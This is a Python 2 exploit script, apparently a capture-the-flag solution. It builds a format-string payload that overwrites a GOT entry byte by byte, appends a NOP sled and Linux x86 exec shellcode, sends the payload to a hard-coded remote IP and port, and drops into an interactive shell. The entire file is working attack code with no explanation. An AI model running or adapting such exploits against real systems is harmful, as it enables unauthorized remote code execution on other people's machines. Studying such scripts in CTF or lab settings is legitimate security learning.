#!/usr/bin/env python

from nulllife import *
import struct


shellcode = NullShell(name = 'exec', arch = 'x86', os = 'linux').get()
stack_chk_got = 0x0804A018
message_data  = 0x0804A070

#location for shellcode address
shell_addr = 0x0804A2F0

payload = "A" * 3
#overwrite got bytexbyte
payload += struct.pack("<I", stack_chk_got)
payload += struct.pack("<I", stack_chk_got + 1)
payload += struct.pack("<I", stack_chk_got + 2)
payload += struct.pack("<I", stack_chk_got + 3)
payload +=  "A" * (183 - len(payload)) #padding to format string
payload += "%s%s" 

#already write 0xE9 bytes
payload += "%13$hn" #write first byte
payload += "%" + str(0x1A2 - 0xE9) + "X" #padding to second byte value
payload += "%14$hn" 
payload += "%" + str(0x204 - 0x1A2) + "X" #padding to 3 byte value
payload += "%15$hn" 
payload += "DEAD" #padding to 4 byte value
payload += "%16$hn"
payload += "\x00"

payload += (shell_addr + 0x10 + - 0x0804A070 - len(payload)) * "\x90"
payload += shellcode


s = NullSocket("203.66.57.148", 9527)
print s.readuntil('?')
s.writeline('y')
print '[!] Send payload'
s.writeline(payload)
print '[+] Got shell...'
s.interactive()